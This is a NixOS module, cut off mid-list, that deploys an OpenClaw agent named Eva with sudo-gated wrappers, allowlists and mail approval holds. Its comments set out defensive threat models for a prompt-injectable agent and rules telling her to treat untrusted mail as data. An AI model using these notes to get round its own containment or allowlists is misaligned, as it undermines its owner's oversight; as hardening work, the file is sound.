# Eva — an OpenClaw agent, deployable on any NixOS host by importing this
# directory (`imports = [ ../../agents/eva ];`). A NixOS module: it pulls in
# modules/openclaw, declares her identity secrets and sets
# my.openclaw.instances.eva. The host supplies the rest:
#   * my.openclaw.package — the one OpenClaw build every agent there runs;
#   * the SHARED service keys (group `agents`) and sops templates referenced
#     below (openclaw/elevenlabs-env, google/, openweather/, zotero/, 2captcha/),
#     and her identity secret VALUES, in its default sops vault;
#   * optionally my.ntfy-alert (whose failureUnits become her restart and
#     journal set) and my.server-stats (the health check is only granted
#     where it runs).
{
  config,
  pkgs,
  lib,
  ...
}:

let
  # Who eva works for. Owner-specific data lives here so it reads apart from
  # her behaviour: it follows her to any host, it is not host config.
  owner = {
    # The owner's own addresses — the ones eva may email without approval and
    # whose DKIM-signed mail she may act on — are a sops value, not a Nix one
    # (this repo is public): openclaw/eva/owner-addresses, one per line, read at
    # runtime by both send wrappers and by rspamd (see machines/homeserver).
    mailAddressesFile = config.sops.secrets."openclaw/eva/owner-addresses".path;
    # The owner's domain: eva's own mailbox and the self-hosted services
    # she may browse and fetch from live under it.
    domain = "acpuchades.com";
  };

  # Fugazi deployment-tick services — baked in at build time so the restart
  # wrapper and the sudoers rules reference exactly the same set.
  fugaziTickUnits = [
    "fugazi-web-testing-deployment-tick-1m"
    "fugazi-web-testing-deployment-tick-3m"
    "fugazi-web-testing-deployment-tick-5m"
  ];

  # Units eva manages: her own service, operational units she needs to
  # restart or diagnose (nominatim, fugazi ticks), and any that page her
  # (my.ntfy-alert.failureUnits). Drives BOTH grants below — the per-unit
  # `systemctl restart` sudo entries and the journal wrapper's read allowlist —
  # so the two can never drift apart.
  evaManagedUnits = lib.unique (
    [ "openclaw-eva" "nominatim-update" ]
    # `or false`: a host without these modules simply grants fewer units.
    ++ lib.optionals (config.my.ntfy-alert.enable or false) config.my.ntfy-alert.failureUnits
    ++ fugaziTickUnits
  );

  # Root-run journal reader for the managed units, replacing eva's old
  # systemd-journal group membership (which exposed auth, mail and web
  # activity for the whole box to a prompt-injectable agent). --no-pager is
  # load-bearing: a pager spawned under sudo is a root shell escape.
  evaJournal = pkgs.writeShellApplication {
    name = "eva-journal";
    text = ''
      unit="''${1:?usage: eva-journal <unit> [lines]}"
      lines="''${2:-200}"
      # Baked in at build time; a variable rather than a literal case subject
      # because shellcheck (which writeShellApplication enforces) flags a
      # constant `case` word as SC2194 and fails the build.
      allowed=" ${toString evaManagedUnits} "
      case "$allowed" in
        *" $unit "*) ;;
        *) echo "eva-journal: unit '$unit' is not in the managed allowlist" >&2
           exit 1 ;;
      esac
      [[ "$lines" =~ ^[0-9]+$ ]] || {
        echo "eva-journal: lines must be numeric" >&2; exit 1; }
      exec ${pkgs.systemd}/bin/journalctl --no-pager -q -u "$unit.service" -n "$lines"
    '';
  };

  # Daily health/security digest, run as root through sudo like eva-journal.
  # Single-purpose on purpose: the Prometheus queries are baked in at build
  # time (NOT read from eva's writable workspace), the endpoint is fixed to
  # loopback, it takes no arguments, and the 24h sshd/auth journal comes out
  # as COUNTS and source IPs only — never raw lines (sudo COMMAND= strings
  # can carry secrets). That gives eva the security signal without handing
  # back the whole-box journal the 2026-09-19 audit took away.
  healthQueries = {
    targets_down = "up == 0";
    failed_units = ''node_systemd_unit_state{state="failed"} == 1'';
    filesystems_over_85pct = ''100 * (1 - node_filesystem_avail_bytes{fstype!~"tmpfs|ramfs|overlay|squashfs|nsfs|efivarfs"} / node_filesystem_size_bytes{fstype!~"tmpfs|ramfs|overlay|squashfs|nsfs|efivarfs"}) > 85'';
    filesystems_readonly = ''node_filesystem_readonly{fstype!~"tmpfs|ramfs|overlay|squashfs|nsfs|efivarfs"} == 1'';
    memory_available_pct = "100 * node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes";
    load15_per_cpu = ''node_load15 / count without (cpu, mode) (node_cpu_seconds_total{mode="idle"})'';
    smart_unhealthy = "smartctl_device_smart_status != 1";
    smart_critical_warning = "smartctl_device_critical_warning > 0";
    disk_temperature_c = ''smartctl_device_temperature{temperature_type="current"}'';
    btrfs_device_errors = "node_btrfs_device_errors_total > 0";
    uptime_seconds = "time() - node_boot_time_seconds";
  };
  serverHealthCheck = pkgs.writeShellApplication {
    name = "server-health-check";
    runtimeInputs = [
      pkgs.coreutils
      pkgs.curl
      pkgs.jq
      pkgs.systemd
    ];
    text = ''
      if [ "$#" -ne 0 ]; then
        echo "server-health-check: takes no arguments" >&2; exit 1
      fi
      queries=${lib.escapeShellArg (builtins.toJSON healthQueries)}

      # Each query -> [{labels, value}], or {error} if Prometheus is unreachable.
      prom="{}"
      for name in $(jq -r 'keys[]' <<<"$queries"); do
        q=$(jq -r --arg n "$name" '.[$n]' <<<"$queries")
        if res=$(curl -sf --max-time 10 --get \
                   --data-urlencode "query=$q" \
                   http://127.0.0.1:${toString config.services.prometheus.port}/api/v1/query); then
          val=$(jq -c '[.data.result[]
                        | {labels: (.metric | del(.__name__, .instance, .job)),
                           value: .value[1]}]' <<<"$res")
        else
          val='{"error":"prometheus query failed"}'
        fi
        prom=$(jq -c --arg n "$name" --argjson v "$val" '. + {($n): $v}' <<<"$prom")
      done

      # MESSAGE is a byte array when not valid UTF-8; normalise to a string.
      msgs='.[] | (.MESSAGE | if type == "array" then implode else . end)'

      ssh=$(journalctl -q --no-pager -o json --since -24h -u sshd.service \
        | jq -s "[$msgs]" | jq -c '
          def ip: capture("(from |user \\S+ )(?<ip>[0-9a-fA-F.:]+) port").ip;
          ([.[] | select(test("^Accepted "))]) as $ok
          | ([.[] | select(test("^(Invalid user|Failed |Connection (closed|reset) by (invalid|authenticating) user)"))]) as $bad
          | {accepted_logins: ($ok | map(capture("^Accepted (?<method>\\S+) for (?<user>\\S+) from (?<ip>\\S+)"))
                               | group_by([.user, .ip, .method])
                               | map(.[0] + {count: length})),
             failed_attempts: ($bad | length),
             invalid_user_attempts: ([$bad[] | select(test("[Ii]nvalid user"))] | length),
             top_failed_sources: ($bad | map(ip // "unknown") | group_by(.)
                                  | map({ip: .[0], count: length})
                                  | sort_by(-.count) | .[:10])}')

      auth=$(journalctl -q --no-pager -o json --since -24h \
               SYSLOG_FACILITY=4 SYSLOG_FACILITY=10 \
        | jq -s -c '
          [.[] | {id: .SYSLOG_IDENTIFIER,
                  m: (.MESSAGE | if type == "array" then implode else . end)}]
          | {sudo_by_user: ([.[] | select(.id == "sudo")
                              | .m | capture("^\\s*(?<user>\\S+) : .*USER=(?<as>\\S+) ;")]
                            | group_by([.user, .as])
                            | map({user: .[0].user, as: .[0].as, count: length})),
             auth_failures: ([.[] | select(.m | test("authentication failure|password check failed|incorrect password|a password is required|FAILED (SU|LOGIN)"))]
                             | group_by(.id) | map({source: .[0].id, count: length}))}')

      jq -n --arg host ${config.networking.hostName} --arg at "$(date -Is)" \
        --argjson prometheus "$prom" --argjson ssh "$ssh" --argjson auth "$auth" \
        '{host: $host, generated_at: $at, window: "24h",
          prometheus: $prometheus, ssh: $ssh, auth: $auth}'
    '';
  };

  # General-purpose service management wrapper. Validates both the action and
  # the unit against baked-in allowlists before invoking systemctl as root.
  # Eva calls: sudo service-ctl <action> <unit>  (no .service suffix)
  # Pattern mirrors eva-journal: sudoers entry on the script itself, no
  # per-command granularity needed — internal validation is the gate.
  serviceCtl = pkgs.writeShellApplication {
    name = "service-ctl";
    text = ''
      action="''${1:?usage: service-ctl <action> <unit>}"
      unit="''${2:?usage: service-ctl <action> <unit>}"

      allowed_actions=" restart start stop reload "
      case "$allowed_actions" in
        *" $action "*) ;;
        *) echo "service-ctl: '$action' is not an allowed action (restart start stop reload)" >&2
           exit 1 ;;
      esac

      allowed=" ${toString evaManagedUnits} "
      case "$allowed" in
        *" $unit "*) ;;
        *) echo "service-ctl: '$unit' is not in the managed unit allowlist" >&2
           exit 1 ;;
      esac

      exec /run/current-system/sw/bin/systemctl "$action" "$unit.service"
    '';
  };

  # Hosts eva's BROWSER may navigate to. Defined ONCE and shared by BOTH gates
  # that must agree on "pages eva is allowed to be on": the browser SSRF
  # navigation gate (settings.browser.ssrfPolicy below) and the solve-captcha
  # page-host gate (actions.solveCaptcha.allowedSites). Keeping them one list is
  # what stops eva from being steered into spending captcha credit on a page she
  # could not have browsed to in the first place.
  evaBrowsableSites = [
    "*.${owner.domain}" # any subdomain; LAN ones still need allowedHostnames below
    # Google Forms (read + submit). NB forms.google.com is only a 301 stub to
    # docs.google.com, so the actual form/viewform/formResponse host is
    # docs.google.com; the rest are its static assets and reCAPTCHA. All
    # content/asset hosts (public; LAN checks N/A). forms.google.com is kept as
    # the entry point even though it 301s to docs.google.com. Font hosts are
    # deliberately omitted — the form still renders/submits with system fonts.
    "forms.google.com" # Forms entry point (301 → docs.google.com)
    "docs.google.com" # the form itself + formResponse submit endpoint
    "www.gstatic.com" # static JS/assets
    "ssl.gstatic.com" # static assets
    "*.googleusercontent.com" # images embedded/uploaded in the form
    "www.google.com" # reCAPTCHA on submit (some forms)
    # UpToDate (Wolters Kluwer) — point-of-care clinical reference. BROWSER-ONLY by
    # necessity: it is a subscription site behind an interactive login, so
    # request-trusted-url (GET, no cookies, no auth header, no redirects) can only
    # ever fetch its login page. That is why it is here and deliberately NOT in
    # actions.requestUrl.trustedSites — putting it there would advertise a read path
    # that returns nothing but a paywall stub. Credentials are handed to the agent
    # directly (she keeps them under ~/.config/eva), not pinned in this repo.
    #
    # `*.` is subdomains-only, so www.uptodate.com is covered and the bare apex is
    # not — navigate to https://www.uptodate.com/… . If the login bounces through an
    # institutional identity provider (OpenAthens, a hospital/university SSO), THAT
    # host has to be added here too, once observed; the SSRF allowlist blocks the
    # redirect target otherwise and the login just dead-ends.
    "*.uptodate.com"
    # fugazi-web's SPA. Listed by name because it is not under acpuchades.com and
    # so the wildcard above doesn't reach it; it resolves into the LAN (AdGuard
    # rewrite), so it needs allowedHostnames below as well. Replaces
    # fugazi.acpuchades.com, retired along with its rewrite.
    "www.fugazitrade.com"
  ];

  # Eva's Python + R library sets, defined ONCE as functions so BOTH the
  # interpreter wrappers (extraPackages below) and the `toolkit` skill
  # (toolkit.python / toolkit.r) read the SAME source. The skill lists are derived
  # with `map (p: p.pname) …`, so the inventory advertised to eva can never drift
  # from what is actually installed — add a package here and it appears in both.
  evaPythonLibs =
    ps: with ps; [
      requests
      icalendar
      vobject
      python-dateutil
      lxml
      openpyxl
      pdfplumber
      # Document handling
      pandas # dataframe layer over openpyxl/pdfplumber/CSV; widest interop
      polars # faster dataframe for larger data (CPU, multi-threaded)
      python-docx # read/write .docx (Word)
      python-pptx # read/write .pptx (PowerPoint)
      pytesseract # OCR wrapper (needs the `tesseract` binary in extraPackages)
      beautifulsoup4 # HTML parsing/cleanup
      markdownify # HTML -> Markdown
      # Ad-hoc CPU modelling
      numpy
      scikit-learn # classical ML (no GPU needed)
      matplotlib # plots / model-eval visuals
    ];
  evaRLibs =
    rp: with rp; [
      tidyverse
      readxl
      writexl
      # Project environments — generates a pinned default.nix for an R project she
      # clones, which `use nix` + direnv then loads (see the `projects` skill).
      rix
      # Statistics / modelling
      lme4 # linear mixed-effects models
      nlme # linear/nonlinear mixed-effects models
      survival # survival analysis (Surv, coxph, survfit)
      # Tidy / tables / reporting
      janitor # clean_names(), tabyl(), remove_empty()
      gt # publication-quality display tables
      gtsummary # summary & regression tables (built on gt)
      rmarkdown
      quarto # Quarto R interface — needs the `quarto` CLI (in extraPackages)
    ];
in
{
  imports = [ ../../modules/openclaw ];

  # Her identity (the openclaw/<agent>/ subtree of the host's vault). The
  # Telegram token is read by systemd LoadCredential (as root), so default
  # ownership is fine. The allowed-ID and owner-address files are read by eva
  # (the ExecStartPre seed) and her mail account, so they are group-readable —
  # but owned by root: a file eva OWNS she could chmod and rewrite, adding an
  # attacker's Telegram ID or address to her own allowlist.
  sops.secrets = {
    "openclaw/eva/telegram-token" = {
      mode = "0400";
    };
    "openclaw/eva/telegram-userid" = {
      group = "eva";
      mode = "0440";
    };
    "openclaw/eva/owner-addresses" = {
      group = "eva-mail";
      mode = "0440";
    };
    # eva-nebot's GitHub token (classic, `repo` scope). That account holds read
    # access to the owner's site repo and its own fork, so the token reaches
    # nothing else; changes go in as pull requests (see the `projects` skill).
    "openclaw/eva/github-token" = {
      mode = "0400";
    };
  };

  # gh reads GH_TOKEN; git asks gh for HTTPS credentials (the GIT_CONFIG_* env
  # form of `credential.https://github.com.helper`).
  sops.templates."openclaw/eva/github-env" = {
    mode = "0400";
    content = ''
      GH_TOKEN=${config.sops.placeholder."openclaw/eva/github-token"}
      GIT_CONFIG_COUNT=1
      GIT_CONFIG_KEY_0=credential.https://github.com.helper
      GIT_CONFIG_VALUE_0=!gh auth git-credential
    '';
  };

  my.openclaw.instances.eva = {
    # The bot is eva_lebbot, so she gets a real account here: /home/eva,
    # her own workspace.
    user = "eva";

    # Her human name, so mail she sends arrives as `Eva Nebot <e.nebot@...>` rather
    # than a bare address (the send wrappers pass it to sendmail as -F, and it is
    # also the account's GECOS name).
    fullName = "Eva Nebot";

    # Execution backend: the "claude-cli" runtime, which reuses a Claude Code
    # subscription login on this host (`claude -p`) so the flat subscription
    # pays instead of per-token API spend — switched back 2026-07-27 to cut
    # the API bill the native runtime was running up.
    #
    # KNOWN TRADEOFF (see the openclaw-execperms notes): under claude-cli,
    # OpenClaw delegates command execution to a Claude Code subprocess, so its
    # OWN exec-approval gate (everything under tools.exec + channels.telegram.
    # execApprovals below) is INERT — those keys configure OpenClaw's in-process
    # exec tool, which this runtime never uses — see the exec block below for
    # the posture this forces and what contains her instead.
    #
    # REQUIRES a valid Claude login for the eva user, or she can't auth at all:
    #   sudo -u eva -H claude          # /login, then quit
    #   systemctl restart openclaw
    # And ANTHROPIC_API_KEY must NOT be in the service env, or Claude Code
    # prefers the API key and bills per-token anyway.
    #
    # Scalar note: the ExecStartPre seed applies this template with
    # `openclaw config patch` (recursive MERGE — objects merge, scalars
    # replace, null deletes). The live config currently holds
    # agents.defaults.agentRuntime.id = "pi"; emitting "claude-cli" here
    # REPLACES that scalar cleanly. (A literal null would only OMIT the key and
    # the merge would keep "pi" forever — so set the string explicitly.)
    agentRuntime = "claude-cli";

    # The module is secret-system agnostic and takes runtime FILES; on this
    # host they are the sops-nix secret paths. The token/ID values live only
    # in the encrypted secrets file, never in this public repo or the store.
    telegram.tokenFile = config.sops.secrets."openclaw/eva/telegram-token".path;
    telegram.allowedIdFile = config.sops.secrets."openclaw/eva/telegram-userid".path;

    # Sonnet 4.6 primary. Haiku 4.5 was tried as the everyday tier to shave
    # the API bill, but it is too weak for eva's tool-using turns, so the
    # primary is back on Sonnet — the cheapest tier that actually holds up
    # for her workload. Delegated *subagents* also run on Sonnet (see
    # subagents.model below), so heavy delegated work stays on the same tier.
    # No model failover. A Gemini Flash fallback lived here for Claude
    # usage-cap outages, but the key's Google project never had Generative-
    # Language-API access to gemini-2.5-flash (persistent 404s), so in
    # practice it only turned transient Claude timeouts into Gemini 404 error
    # replies. Dropped 2026-07-26; when Claude fails, eva now surfaces the
    # Claude error instead of bouncing onto a broken fallback. Re-add via
    # fallbackModels + the openclaw/gemini-env secret if a working
    # key/project is ever provisioned.
    model = "anthropic/claude-sonnet-4-6";
    fallbackModels = [ ];
    settings.agents.defaults.subagents.model = "anthropic/claude-sonnet-4-6";

    # Memory-search embeddings: a LOCAL, keyless embedder. openclaw's default
    # embedding provider is "openai" (needs an OPENAI_API_KEY we do not put on
    # the box — `openclaw memory index` failed "No API key found for provider
    # openai"), and Anthropic has no embeddings API so the subscription doesn't
    # help. "local" runs a GGUF on-box via node-llama-cpp: no key, no per-token
    # cost, memory text stays on the host. The GGUF is supplied here (not baked
    # into the module), same as stt.model — nomic-embed-text v1.5 Q4_K_M is
    # ~84MB and CPU-friendly; swap url+hash for a multilingual model if Spanish
    # recall needs it. After deploy, (re)index as eva with the service env:
    #   sudo -u eva env HOME=/home/eva OPENCLAW_STATE_DIR=/var/lib/openclaw/eva \
    #     OPENCLAW_CONFIG_PATH=/var/lib/openclaw/eva/openclaw.json \
    #     openclaw memory index --force --verbose
    memorySearch = {
      enable = true;
      provider = "local";
      localModelPath = pkgs.fetchurl {
        url = "https://huggingface.co/nomic-ai/nomic-embed-text-v1.5-GGUF/resolve/main/nomic-embed-text-v1.5.Q4_K_M.gguf";
        hash = "sha256-1OOIiU4JzzgW6LCJbYHSZbVeep//mrA/6L9O9eESlaw=";
      };
    };

    # Heartbeat: eva takes an autonomous turn every hour, but only during
    # waking hours (08:00–22:00 Europe/Madrid, matching the host timezone) so
    # she doesn't ping overnight. Driven by the module's first-class options
    # (the every/activeHours defaults already match this; timezone is set
    # explicitly so the window is local wall-clock, not the process TZ).
    heartbeat = {
      enable = true;
      every = "1h";
      activeHours = {
        start = "08:00";
        end = "22:00";
        timezone = "Europe/Madrid";
      };
      # Silence is the default outcome: an hourly all-clear is noise, so only
      # something that needs the owner gets delivered.
      prompt = lib.concatStringsSep " " [
        "Heartbeat poll. Run your @heartbeat checks (plus @morning or @evening when"
        "they apply), following the heartbeat monitor scratch when provided."
        "Message the owner ONLY when something needs his attention or action: a"
        "failure or degradation, a threshold crossed, something unexpected or"
        "security-relevant, a deadline or a reply he is waiting on."
        "Routine all-clear results (server healthy, good readiness scores, mail"
        "triaged as expected) are not worth a message: do not send a status"
        "summary just to say everything is fine. If nothing needs him, reply"
        "NO_REPLY. When you do alert, send only the items that matter."
        "Recurring tasks are automations; do not infer or repeat old tasks from"
        "prior chats."
      ];
    };

    # Extra tooling eva can invoke by name (the module puts each on the
    # service PATH and in the system profile). Being reachable is separate
    # from being unprompted; whether a run needs approval is
    # decided by the exec allowlist below. ffmpeg/pandoc/xmllint are ALSO
    # pre-blessed there (run unprompted); imagemagick and the python3/R
    # interpreters are NOT — an actual invocation of those still raises the
    # inline Telegram approval prompt. Kept here (not in the module) so the
    # module stays deployment-agnostic. python3/R carry the packages she needs
    # baked in, so `import requests` / `library(tidyverse)` resolve without a
    # network fetch or a writable site-library.
    extraPackages = with pkgs; [
      chromium # browser automation via CDP (OpenClaw browser tool)
      cups # `lp`/`lpr`/`lpstat`/… CUPS client tools (submit/query/cancel print jobs)
      # Project-environment tooling, for repos she clones into her own tree. Without
      # these the `projects` skill would tell her to run commands she does not have:
      # direnv loads a project's .envrc, uv manages a Python project's virtualenv.
      # (`nix-shell`/`nix develop`, for `use nix` projects, come from the system.)
      direnv
      uv
      gh # pull requests from her fork (see the `projects` skill)
      ffmpeg # full ffmpeg (STT already pulls ffmpeg-headless; this adds codecs)
      imagemagick # `convert`/`magick` image manipulation
      libxml2.bin # `xmllint` (lives in the .bin output, not the default one)
      pandoc # document conversion
      hugo # static-site generator (build + `hugo server` live preview)
      quarto # Quarto CLI — renders the rPackages.quarto R interface (evaRLibs)
      # OCR engine; `pytesseract` shells out to this binary. Default ships eng
      # only, so bundle the languages eva actually sees (English/Spanish/Catalan).
      (tesseract.override {
        enableLanguages = [
          "eng"
          "spa"
          "cat"
        ];
      })
      (python3.withPackages evaPythonLibs)
      (rWrapper.override { packages = evaRLibs rPackages; })
    ];

    # Capability inventory rendered into the `toolkit` skill so eva KNOWS what she
    # already has (installing it grants the capability but does not tell her).
    # python/r are derived from the same sets she installs (evaPythonLibs/evaRLibs),
    # so they cannot drift. Informational only — running the interpreters is still
    # gated by the exec policy; the skill says so.
    toolkit = {
      python = map (p: p.pname) (evaPythonLibs pkgs.python3Packages);
      r = map (p: p.pname) (evaRLibs pkgs.rPackages);
      cli = [
        "direnv (loads a project's .envrc — see the `projects` skill)"
        "uv (Python project/virtualenv manager — `uv venv`, `uv add`)"
        "nix-shell / nix develop (enters a `use nix` project environment)"
        "pandoc (document conversion)"
        "hugo (static-site generator — build a site to check a change)"
        "gh (GitHub CLI, as eva-nebot — forks and pull requests)"
        "quarto (publishing engine — .qmd/.Rmd to HTML/PDF/docx)"
        "tesseract (OCR — languages: eng, spa, cat)"
        "convert / magick (ImageMagick)"
        "ffmpeg / ffprobe"
        "chromium (headless browser)"
        "xmllint"
        "lp / lpstat (CUPS printing)"
      ];
      notes = ''
        Import names differ from install names for some Python libs: scikit-learn ->
        `import sklearn`, beautifulsoup4 -> `import bs4`, python-docx -> `import docx`,
        python-pptx -> `import pptx`.

        OCR: tesseract carries English/Spanish/Catalan data — select with `-l spa` /
        `-l cat` on the CLI, or `pytesseract.image_to_string(img, lang="spa")`.

        Server diagnostics (root-run wrappers; invoke them with `sudo` and the
        EXACT path shown — sudo only accepts that path):

        ${
          lib.optionalString (config.my.server-stats.enable or false) ''
            - `sudo ${lib.getExe serverHealthCheck}` — daily health and security
              digest as JSON, no arguments: Prometheus checks (targets down, failed
              units, filesystems over 85% or read-only, memory, load per CPU, SMART
              status/warnings/temperatures, btrfs device errors, uptime) plus the last
              24h of sshd and auth activity summarised as counts (accepted logins by
              user/IP, failed and invalid-user attempts, top failing source IPs, sudo
              use by user, auth failures). Empty lists mean nothing to report.
          ''
        }- `sudo ${lib.getExe evaJournal} <unit> [lines]` — the journal of one of
          the units you manage (${lib.concatStringsSep ", " evaManagedUnits}),
          without the `.service` suffix.
        - `sudo ${lib.getExe serviceCtl} <action> <unit>` — general service
          manager. Allowed actions: restart start stop reload. Allowed units
          (same set as eva-journal): ${lib.concatStringsSep ", " evaManagedUnits}.
          No `.service` suffix. Examples:
            sudo ${lib.getExe serviceCtl} restart nominatim-update
            sudo ${lib.getExe serviceCtl} restart fugazi-web-testing-deployment-tick-1m

        You are NOT in the systemd-journal group: a plain `journalctl` shows
        only your own logs. Use these wrappers instead of trying to widen that.

        This host has NO GPU. Use CPU-friendly methods (scikit-learn) for modelling;
        no deep-learning frameworks (torch/TensorFlow/CUDA) are installed.
      '';
    };

    # Eva's own working-method skills, as plain markdown under ./skills (one
    # directory per skill, each holding a SKILL.md). They are hers, not the module's:
    # the module only generates the skills it must DERIVE from config (policy,
    # check-email, solve-captcha, toolkit), and prose belongs in a .md file where it
    # reads and diffs as prose. Both are staged and loaded exactly like the generated
    # ones.
    #
    # - `gtd`: how she processes anything that arrives — capture/clarify/organize/
    #   reflect/engage, the markdown lists under ~/workspace/gtd, and the disposition
    #   of EVERY mail she touches (trash / reference / incubate / do-now / next action
    #   / project / delegate / waiting-for / calendar) with the mblaze command for
    #   each, so a sweep ends with an empty inbox instead of a read one. It restates
    #   rather than relaxes the inbound-trust rule: an untrusted sender's mail can
    #   become reference or a question for the owner, never an action she performs.
    #   The Archive/Waiting/Someday maildirs it files into are hers to create (mmkdir
    #   is blessed via mail.manageMaildir), and the daily/weekly reviews land on the
    #   heartbeat turns configured above.
    # - `projects`: repos she clones get worked on through THEIR declared environment,
    #   not her baked interpreters. The tooling this assumes is in extraPackages
    #   (direnv, uv) and evaRLibs (rix) above; it also tells her NOT to bootstrap an
    #   env for ad-hoc scratch work, where the baked python3/R are the right tool.
    #   rix is the load-bearing one for R: it emits a default.nix that PINS its own
    #   nixpkgs (the rstats-on-nix fork, whose binaries the cachix substituter in
    #   modules/r-dev/system.nix already serves) instead of `import <nixpkgs> {}`. That
    #   keeps a project self-contained and sidesteps the host's ICU/V8 skew entirely —
    #   which is why she needs no per-user overlay to build gt/gtsummary in a project.
    # - `calendar`: the protocol for anything with a date and a time. The module's
    #   generated skills already say WHICH command to use (policy: `check-calendar`;
    #   check-email: the `make-invite` + sender workflow); this one supplies the
    #   PROCEDURE those commands sit inside — a `TOOLS.md` registry mapping each of
    #   his calendars to the address an invitation must be sent to (the fix for
    #   "wrong calendar"), a conflict check that is run before every booking and
    #   knows check-calendar's two window traps (the window starts NOW, so a far date
    #   needs a wide `--days`; and `--max` truncates the LATEST events, so a wide
    #   window with the default 50 silently drops the very date being checked and
    #   reads as "free"), and a fixed `calendar.md` line shape carrying `cal:`/`uid:`/
    #   `seq:` so an event can actually be moved or cancelled later. It restates the
    #   gtd trust rule for this surface: she never RSVPs for him, and a third-party
    #   meeting request is a proposal for @owner, not a booking.
    # - `references`: how a search is run and how references are handled — PICO
    #   question, a reproducible MeSH+[tiab] query recorded verbatim with its date and
    #   hit count, screen/appraise (including a retraction check via efetch's
    #   publication types), legal full text only, and Zotero through the check-zotero /
    #   zotero-add wrappers. Named `references`, not `literature`, so it cannot be read
    #   as a creative-writing skill. Its headline rule is the anti-hallucination one:
    #   no identifier reaches a document until it has resolved against a real API
    #   response in that session — a fabricated citation is invisible in review and
    #   ends up attributed to him. It also states the two limits honestly instead of
    #   papering over them: UpToDate is BROWSER-ONLY (subscription login, so
    #   request-trusted-url can only ever fetch its login page) and is a tertiary
    #   source to be followed to its primary references, never cited itself.
    # - `seo-marketing`: search-visibility and digital-marketing work on ANY property —
    #   his site (changed through pull requests from her fork), a project's
    #   docs, a study landing page, a mailing list. Deliberately GENERIC and
    #   deliberately THIN on conventions: a property's own repo docs are named as the
    #   authority (front-matter fields and their lengths, how keywords derive from
    #   taxonomies, translation pairing, image detection) rather than copied here into
    #   a second version that would drift. What it adds is the method and the limits.
    #   Method: establish the goal before touching anything (traffic is not one), audit
    #   what is SERVED and never the source (config plus theme overrides sit between a
    #   front-matter field and the emitted tag, which is how a page looks right in
    #   source and ships a truncated snippet), a per-page check table plus site-wide
    #   ones, and — since her fetch/browse paths are host-allowlisted — say so when a
    #   property is unreachable instead of passing a template read off as an output
    #   check. Its honesty rule matters most: with no Search Console and no analytics
    #   she can state what the output CONTAINS and never what it will achieve, and she
    #   invents no volume, difficulty or traffic number. Beyond search it covers the
    #   other channels in the order that matters (audience → message → channel →
    #   measurement), the identity graph as the highest-value work for a person-brand,
    #   email consent/SPF-DKIM-DMARC, EU consent before any tracker, and a hard NEVER
    #   list — doorway pages, generated filler as his voice, link schemes, fake
    #   engagement, unsolicited bulk mail, dark patterns, and any health claim pitched
    #   harder than the evidence to attract attention. Boundaries: she does not
    #   publish, does not send a list, does not post, does not spend, and never touches
    #   a repo's PII pipeline.
    # - `research-projects`: the scientific counterpart to `projects` (which is only
    #   about a repo's ENVIRONMENT). The dossier/decision-log layout under
    #   ~/workspace/research, the patient-data rule (identifiable data never leaves
    #   the host — no repo, no mail, no API), manuscript versioning (`vNN_date_initials`,
    #   never edit a version that has been sent), circulating drafts to co-authors
    #   through the ordinary approval gate, authorship as never hers to change,
    #   journal/reporting-guideline selection before the draft is finished, AoE
    #   congress deadlines, and the point-by-point reviewer response built BEFORE the
    #   edits. It hands off to `calendar` for every date and to `projects` for the
    #   analysis repo.
    # - `social`: the social-platform sibling of `seo-marketing`, and just as GENERIC —
    #   it runs a presence on ANY account (a researcher's profile, a project channel,
    #   an org page), not one tied to a person or a platform, so it opens by making her
    #   state who the account is for before posting (followers are not a goal). Its
    #   load-bearing rules mirror the ones that recur across her skills: posting under
    #   an owner's name is a gated outward act through the ordinary approval gate (draft
    #   when no posting path is set up or the item is sensitive, post when he's
    #   authorised one — deferring to `policy` for the gate itself), she cannot measure
    #   reach with no analytics so she must not promise it, and an untrusted DM/mention
    #   is reference or a question for @owner (the inbound-trust rule). The conduct line
    #   is written for whatever authority the account carries — a clinician's, a
    #   researcher's, a lawyer's, a public office's: no health/legal/financial claim
    #   pitched past the evidence (short formats punish nuance), no individual advice,
    #   no confidential or personal data even de-identified without consent AND sign-off
    #   (deferring to `research-projects`), no pre-announcing embargoed work. Then a
    #   per-platform section — LinkedIn, X with the note that communities have
    #   fragmented across Bluesky/Mastodon, Instagram, TikTok, YouTube, and the identity
    #   graph — each saying what the platform is FOR and where it goes wrong, not a
    #   growth playbook. Accessibility (alt text, captions) is a standing rule. It hands
    #   off to `policy` for the approval gate, `seo-marketing` for the identity graph and
    #   link-preview metadata, `references` for anything citing literature, and
    #   `calendar` for scheduling around a date.
    extraSkillDirs = [ ../../skills ];

    # Eva's email: read her Maildir + a recipient-gated send-email helper.
    # The owner's addresses send with no approval; mail to anyone else is HELD
    # for him to release. That hold is real only because the send wrappers run
    # as eva-mail (submitUser) and the host refuses eva's own account mail
    # submission (my.mail-server.deniedSubmitUsers) — so the wrappers are the
    # only way mail leaves her. manageMaildir lets her organise her OWN mailbox
    # (flag/refile/mkdir/incorporate/deliver) — local Maildir mutation only.
    mail = {
      enable = true;
      manageMaildir = true;
      fromAddress = "e.nebot@${owner.domain}";
      submitUser = "eva-mail";
      # Shared with send-trusted-mail so the two outbound wrappers never drift.
      unpromptedRecipientsFile = owner.mailAddressesFile;
    };

    # Sanctioned self-gating action wrappers (see my.openclaw.actions). These
    # are eva's ONLY unprompted outbound paths: request-trusted-url can GET/
    # HEAD only *.acpuchades.com, and send-trusted-mail can only reach the
    # trusted addresses below. Raw curl/wget/sendmail stay gated, and the
    # policy skill tells eva to reach for these wrappers first.
    actions = {
      requestUrl = {
        enable = true;
        # EXACT calendar hosts (never *.google.com etc.) so eva can fetch .ics
        # feeds via `check-calendar <url>` without also opening the provider's
        # other endpoints (Forms, Analytics, proxies). GET-only + --max-redirs 0
        # already, so an exact calendar host is not an exfil path. Nextcloud is
        # already covered by *.acpuchades.com.
        trustedSites = [
          "*.${owner.domain}" # Local services
          "generativelanguage.googleapis.com" # Google Gemini
          "calendar.google.com" # Google Calendar .ics export
          "*.caldav.icloud.com" # Apple iCloud (this subdomain only serves CalDAV)
          "outlook.office365.com" # Microsoft 365 published calendars
          "outlook.live.com" # Outlook.com published calendars
          # Research/health REST APIs (owner's call, all read-only GET). All are
          # EXACT hosts (never provider apexes with redirects/proxies), reputable
          # (a leaked query param isn't adversary-retrievable), and keyless or
          # query-param-keyed — the three properties that make a host safe to reach
          # through request-trusted-url (GET/HEAD only, no auth header, no redirect
          # following). github.com is deliberately kept OUT (see the browser SSRF
          # note below): the one plausibly attacker-steerable host.
          "eutils.ncbi.nlm.nih.gov" # PubMed E-utilities (keyless)
